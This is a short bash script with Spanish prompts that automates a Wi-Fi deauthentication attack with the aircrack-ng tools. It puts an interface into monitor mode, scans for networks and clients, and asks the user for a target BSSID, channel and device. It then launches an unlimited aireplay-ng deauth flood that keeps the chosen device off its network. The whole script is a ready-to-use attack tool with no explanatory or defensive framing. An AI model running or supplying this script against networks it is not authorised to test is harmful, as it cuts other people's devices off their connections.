function main(){
	echo "Mostrando interfaces de red..."
	sleep 1
	ip a
	read -p 'Interfaz a elegir: ' interfaz
	export interfaz

	echo "Poniendo ${interfaz} en modo monidor..."
	sleep 1
	airmon-ng start ${interfaz}
	echo ""
	echo "${interfaz} puesta correctamente en modo monitor"
	read -p "Nombre de la interfaz en modo monitor: " moniinter
	sleep 1
	echo ""

	echo "Mostrando redes disponibles:"
	sleep 1
	echo "Recordar BSSID y el canal asignado a la red!"
	sleep 2
	airodump-ng ${moniinter}

	echo "Escaneando dispositivos de la red seleccionada..."
	sleep 2

	read -p "BSSID de la red:" bssid
	read -p "Canal de la red:" channel

	airodump-ng -d ${bssid} -c ${channel} ${moniinter}

	read -p "Dispositivo seleccionado para expulsar de la red: " device

	echo "Expulsando ${device} de la red!"
	sleep 2
	gnome-terminal -- aireplay-ng -0 0 -a ${bssid} -c ${device} ${moniinter}
	sleep 1
	echo "Cerrar terminal para finalizar :)"
}

trap ctrl_c INT

function ctrl_c(){
	airmon-ng stop ${interfaz}
}

main
